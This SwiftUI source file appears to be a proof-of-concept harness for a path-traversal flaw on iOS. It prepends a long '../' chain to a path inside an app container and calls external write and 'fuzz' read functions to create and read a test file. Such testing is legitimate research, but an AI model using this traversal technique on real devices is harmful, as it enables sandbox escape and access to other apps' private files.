import SwiftUI

struct ContentView: View {
    private let targetPath = "/var/mobile/Containers/Data/Application/6A65489C-F668-4C29-AFA2-4B1FE2C4C645/Documents/hellobommer_test"
    private let traversalPrefix = "../../../../../../../../../../.."

    @State private var running = false
    @State private var showAlert = false
    @State private var alertTitle = ""
    @State private var alertMessage = ""

    var body: some View {
        VStack(spacing: 24) {
            HStack(spacing: 20) {
                Button("Write") { runWrite() }
                    .buttonStyle(.borderedProminent)
                    .disabled(running)

                Button("Read") { runRead() }
                    .buttonStyle(.bordered)
                    .disabled(running)
            }

            if running {
                ProgressView()
            }
        }
        .padding()
        .alert(alertTitle, isPresented: $showAlert) {
            Button("OK") {}
        } message: {
            Text(alertMessage)
        }
    }

    private func runWrite() {
        running = true
        let destination = targetPath
        let identifier = traversalPrefix + destination

        Task.detached {
            let result = dd_write(identifier, destination)
            await finish(
                title: result == 0 ? "Write OK" : "Write Failed",
                message: result == 0
                    ? "Created:\n\(destination)"
                    : "dd_write returned \(result)\n\(destination)"
            )
        }
    }

    private func runRead() {
        running = true
        let destination = targetPath
        let identifier = traversalPrefix + destination

        Task.detached {
            let bufferSize = 8192
            var buffer = [CChar](repeating: 0, count: bufferSize)
            var outputLength = 0
            var command: Int32 = -1
            let result = dd_fuzz_read(
                identifier,
                &buffer,
                bufferSize,
                &outputLength,
                &command
            )

            let bytes = buffer.prefix(outputLength).map { UInt8(bitPattern: $0) }
            let content = String(bytes: bytes, encoding: .utf8)
                ?? "(non-UTF8, \(outputLength) bytes)"

            await finish(
                title: result == 0 ? "Read OK (cmd \(command))" : "Read Failed",
                message: result == 0
                    ? "\(destination)\n\n\(content)"
                    : "No command returned data.\n\(destination)"
            )
        }
    }

    @MainActor
    private func finish(title: String, message: String) {
        running = false
        alertTitle = title
        alertMessage = message
        showAlert = true
    }
}
